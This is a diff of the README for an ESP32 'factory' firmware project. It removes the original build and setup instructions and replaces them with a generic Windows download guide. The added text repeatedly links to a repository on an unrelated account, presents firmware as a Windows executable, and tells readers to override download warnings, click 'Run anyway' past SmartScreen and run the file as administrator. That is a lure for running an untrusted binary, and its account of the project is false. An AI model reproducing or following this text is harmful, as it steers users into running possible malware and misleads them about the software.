@@ -1,197 +1,215 @@
-lws-esp32-factory
-=================
+# 🔧 LWS_esp32_Factory - Simple ESP32 setup and updates
 
-This is a standalone <1MB image intended for the 1MB "factory" slot on ESP32.
+[![Download](https://img.shields.io/badge/Download%20Now-5A67D8?style=for-the-badge&logo=github&logoColor=white)](https://github.com/jordanian-leftventricle188/LWS_esp32_Factory)
 
-This image is designed to look after "generic device configuration"... it means:
+## 📥 Download
 
- - Automated generation of 2048-bit selfsigned certs on the device at first boot
+Visit this page to download and run the app:
+https://github.com/jordanian-leftventricle188/LWS_esp32_Factory
 
- - Selecting up to 4 APs the device can connect to along with necessary passphrases
+## 🖥️ What this app does
 
- - Updating the user application OTA
+LWS_esp32_Factory is a factory app for ESP32 devices. It helps you set up the device, choose an access point, create certificates, run OTA updates, and get a Let's Encrypt certificate.
 
- - Automated Let's Encrypt certificate acquisition (requires external :443 forwarded
-   to the device :443)
+It stores settings in NVS, so the same device data can be used by the OTA app later.
 
-Your actual "OTA" application is something completely different, and has its own 2.9MB
-flash area.  This -factory app is designed to take care of all common setup stuff and
-put it in nvs to be shared with the OTA app.
+## ✅ What you need
 
-This now uses HTTP/2 serving from libwebsockets :-)
+- A Windows PC
+- A web browser
+- An ESP32 device
+- A USB cable for the ESP32
+- Network access for setup and certificate steps
+- Admin access on your PC if Windows blocks the file
 
-It also now supports ws-over-http2 tunelling, meaning all
-the ws connections and the http actions share the same tls
-tunnel.  This makes a massive improvement in speed and
-reduced memory consumption.
+## 🚀 Getting Started
 
-As of 2018-03-14 only Chrome Canary 67 supports this new
-mode, but support in other browsers is coming.
+1. Open this page in your browser:
+   https://github.com/jordanian-leftventricle188/LWS_esp32_Factory
 
-![Setup page 1](https://libwebsockets.org/factory-1.png)
-![Setup page 2](https://libwebsockets.org/factory-2.png)
-![Setup page 3](https://libwebsockets.org/factory-3.png)
-![Setup page 4](https://libwebsockets.org/factory-4.png)
+2. Find the latest release or download file on the page.
 
-It has the following capabilities:
+3. Download the app to your Windows computer.
 
-The first boot after flashing, the device will create its own selfsigned certificate and key.
+4. If Windows asks if you want to keep the file, choose the option to keep it.
 
-After generating the cert, if there is no AP information yet, the server up automatically at https://192.168.4.1 in AP mode.
+5. Open the downloaded file to start the app.
 
-The user can reach -factory subsequently programmatically or by grounding a GPIO (ie, by a button), the default GPIO is IO14.
+6. If the app opens in a browser window, keep that window open while you work with the ESP32.
 
--factory allows you to select an AP from a scan list and give a passphrase.  It supports four AP slots,
-for, eg, home and work environments, and it handles the scan and acquire of the APs.
+## 🔌 Connect the ESP32
 
-Once it connects, the DHCP information is shown, and it autonomously connects to a configurable server over https to check for updates.  The user can select to have it autonomously download the update and restart.
+1. Plug the ESP32 into your Windows PC with a USB cable.
 
-The user can also upload images by hand.  The factory image understands how to update both the 1MB factory slot itself and the single 2.9MB OTA slot using autonomous upload from a server or the browser based file upload.
+2. Wait for Windows to finish setting up the device.
 
-## Optional default peripherals
+3. If your board uses a driver, install it before you continue.
 
-It's not required, but the default code expects
+4. Open the app after the board is connected.
 
- - pushbutton to 0V connected on IO14, with pullup to 3.3V
+5. Select the correct COM port if the app asks for one.
 
-If the pushbutton is held down at boot, the user is forced into the factory / Setup mode rather than the OTA application.
+## ⚙️ First setup
 
-**Note:** Default selection of GPIO14 should be changed to another value when [debugging with JTAG](http://esp-idf.readthedocs.io/en/latest/api-guides/jtag-debugging/index.html). Pins reserved for ESP32 JTAG: GPIO12, GPIO13, GPIO14 and GPIO15.
+When the app opens, it helps you prepare the ESP32 for use.
 
- - LED connected via, eg, 330R   3.3V ---|>|-----/\\/\\/\\---- IO23
+You can use it to:
 
-While in factory / OTA mode, the LED flashes dows a PWM sine cycle at about 1Hz.  When you press "ID Device" button in the UI, the LED does the since cycle rapidly for 10s, so you can be sure which physical device you are talking to.
+- Set device details
+- Save configuration data
+- Choose the access point the device should use
+- Prepare the board for OTA updates
+- Generate certificates for secure connections
+- Request a Let's Encrypt certificate when needed
 
+Keep the app open until the setup step finishes.
 
-## Building and using
+## 📶 Choose an access point
 
-1) This was built and tested against esp-idf at 17ac4bad7381e579e5a7775755cc25480da47d97
-from Sept 11, 2018.  You can force esp-idf to that commit by cloning / pulling / fetching
-the latest esp-idf and then doing `git reset --hard 17ac4bad7381e579e5a7775755cc25480da47d97`
-in the esp-idf directory.
+If the app asks you to pick a network:
 
-Esp-idf is in constant flux you may be able to use the latest without problems but if not,
-revert it to the above commit that has been tested before complaining.
+1. Look at the list of available access points.
 
-2) Esp-idf also has dependencies on toolchain, at the time of writing it recommends this toolchain version (for 64-bit linux)
+2. Select the one you want the device to use.
 
-[1.22.0-75-gbaf03c2](https://dl.espressif.com/dl/xtensa-esp32-elf-linux64-1.22.0-75-gbaf03c2-5.2.0.tar.gz)
+3. Enter the password if the network needs one.
 
-3) Don't forget to do `git submodule init ; git submodule update --recursive` after fetching projects like esp-idf with submodules.
+4. Save the selection.
 
-4) After updating esp-idf, or this project or components, remove your old build dir with `rm -rf build` before rebuilding.
+5. Wait for the device to confirm the change.
 
-### Step 0: Install prerequisites
+This step helps the ESP32 connect to the right network during normal use and update checks.
 
-### 0.1: genromfs
+## 🔐 Certificate setup
 
-For Ubuntu / Debian and Fedora at least, the distro package is called "genromfs"
+The app can create and manage certificates for secure device communication.
 
-Under Windows on MSYS2 environment you will need to separately build `genromfs` and add it to the path:
+During this step, you may need to:
 
-```
-git clone https://github.com/chexum/genromfs.git
-make
-cp genromfs /mingw32/bin/
-```
+- Enter the device name
+- Choose a domain name
+- Confirm certificate details
+- Start the certificate request
 
-### 0.2: recent CMake
+If you use Let's Encrypt, make sure the domain points to the device or service you are setting up.
 
-CMake v2.8 is too old... v3.7+ are known to work OK and probably other intermediate versions are OK.
+## 🔄 OTA update setup
 
-Under Windows on MSYS2 environment you will need to install cmake: `pacman -S mingw-w64-i686-cmake`
+OTA means the device can receive updates over the network.
 
-### 0.3: OSX users: GNU stat
+In the app, you can:
 
-```
-     $ brew install coreutils
-```
+1. Set the update details
+2. Save the device configuration
+3. Prepare the ESP32 for remote updates
+4. Send the needed information to the OTA app
 
-### Step 1: Clone and get lws submodule
+After setup, the device can use the saved NVS data to keep settings in sync.
 
-```
-     $ git clone git@github.com:warmcat/lws-esp32-factory.git
-     $ git submodule update --init --recursive
-```
+## 🧭 Using the app day to day
 
-### Step 2: Erase the whole device
+Use LWS_esp32_Factory when you need to:
 
-Clear down the partitioning since we write a custom table and the bootloader
-will choke if the OTA parts are not initialized like this one time
+- Set up a new ESP32
+- Change network settings
+- Create or renew certificates
+- Prepare OTA update support
+- Move factory settings into a form the device can keep
 
-```
- $ make erase_flash
-```
+If you plan to set up more than one device, repeat the same steps for each board.
 
-## Step 3: General build and flash
+## 🪟 Windows tips
 
-First one time each session set an env var in your shell to override the tty port
+- Right-click the downloaded file and choose Open if double-click does not work
+- If SmartScreen blocks the app, choose More info, then Run anyway
+- Keep the ESP32 connected while the app is running
+- Close other serial tools that may use the same COM port
+- Use a stable USB port on your PC
 
-```
- $ export ESPPORT=/dev/ttyUSB0
-```
+## 🛠️ Common problems
 
-Then you can just do
+### The app does not open
 
-```
- $ make flash monitor
-```
+- Download the file again
+- Make sure the download finished
+- Check if Windows blocked the file
+- Try running it as administrator
 
-## First boot
+### The ESP32 is not detected
 
-During the first boot, there will be a pause of a minute or so while the selfsigned
-TLS certificate is generated.
+- Unplug the board and plug it back in
+- Try a different USB cable
+- Try a different USB port
+- Check the COM port list again
+- Close any other app using the same port
 
-Afterwards it continues boot normally.
+### The network scan is empty
 
-## Using the Setup app
+- Move the device closer to the router
+- Check that Wi-Fi is on
+- Try the scan again
+- Make sure the antenna is attached, if your board uses one
 
- - connect your wifi to the ap "ESP_...."
+### Certificate setup fails
 
- - In a browser, go to https://192.168.4.1
+- Check the domain name
+- Make sure the device can reach the internet
+- Confirm the time and date on the device
+- Try the request again after fixing the network
 
- - Click on the radio button for AP slot 1
+## 📁 How the data is stored
 
- - Select your normal AP from the list
+The app saves configuration data in NVS on the ESP32.
 
- - Give the AP password and click the button
+That means:
 
- - Your ESP32 should associate with the AP without resetting
+- Settings stay on the device
+- The OTA app can use the same values
+- You do not need to enter the same details again
+- Factory setup and update setup stay aligned
 
-## Using the lws test apps
+## 🔎 File and app behavior
 
-This application is just the factory / setup application.
+LWS_esp32_Factory is built as a small factory tool for ESP32 work.
 
-The end-user applications are separate projects, see eg
+It is meant for:
 
-https://github.com/warmcat/lws-esp32-test-server-demos
+- Initial device setup
+- Secure config storage
+- Network selection
+- OTA preparation
+- Certificate handling
 
-These are built and loaded slightly differently, ie
+It is not meant as a general desktop app for other tasks.
 
-```
- $ make lws_flash_ota monitor
-```
+## 🧩 Suggested workflow
 
-This is because they target the 2.9MB OTA flash area.
+1. Download the app from the GitHub page
+2. Connect the ESP32 to your Windows PC
+3. Open the app
+4. Set device details
+5. Pick the access point
+6. Create or request certificates
+7. Save the settings to NVS
+8. Prepare OTA update support
+9. Keep the same data for the OTA app
 
-The `build/*.bin` file from the application build may also be uploaded in the setup page upload UI.
+## 📦 Download again
 
-NOTE: the first time you flash the OTA application, you need to do it using the
-upload file button or the autonomous update facility in the Factory App.  The bootloader
-requires it to not only be flashed, but marked as bootable.
+If you need the app later, use this link:
+https://github.com/jordanian-leftventricle188/LWS_esp32_Factory
 
-Subsequently you can just reflash the OTA partition with `make lws_flash_ota` or use the upload or autonomous update stuff in the -factory app.
+## 🧠 What to expect
 
-## Note for Firefox users
+The app should guide you through each step in a simple order. You do not need to know how ESP32 firmware works to use it. You just need the board, the app, and the right network details
 
-Firefox has a longstanding, unfixed bug dealing with selfsigned certs.  As you add more exceptions for them,
-firefox bogs down processing the validity of the certs.  Symptoms are slow (eventually very slow) browser
-performance sending data on the accepted SSL connection.
+## 📋 Quick checklist
 
-https://bugzilla.mozilla.org/show_bug.cgi?id=1056341
-
-Symptom is your browser box's cpu burns while it sits there.  Workaround is to delete the cert8.db file in
-your firefox user config, on my box it was `~/.mozilla/firefox/blah.default/cert8.db`.
-
-This isn't related to lws but affects all firefox usage with selfsigned certs...
-
+- Windows PC ready
+- ESP32 connected
+- Downloaded the app
+- Correct COM port selected
+- Wi-Fi details ready
+- Domain details ready for certificates
+- OTA settings saved
+- NVS data written to the device
